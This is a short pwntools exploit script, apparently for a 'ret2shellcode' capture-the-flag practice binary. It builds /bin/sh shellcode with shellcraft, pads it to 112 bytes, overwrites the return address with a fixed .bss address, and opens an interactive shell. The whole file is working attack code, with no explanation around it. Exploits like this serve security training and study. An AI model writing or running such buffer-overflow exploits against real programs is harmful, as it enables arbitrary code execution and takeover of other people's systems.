from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = "debug"
sh = process('./ret2shellcode')
# sh = gdb.debug('./ret2shellcode')
shellcode = asm(shellcraft.sh())
bss_addr = 0x0804A080

pause()
sh.sendline(shellcode.ljust(112, b'A') + p32(bss_addr))
sh.interactive()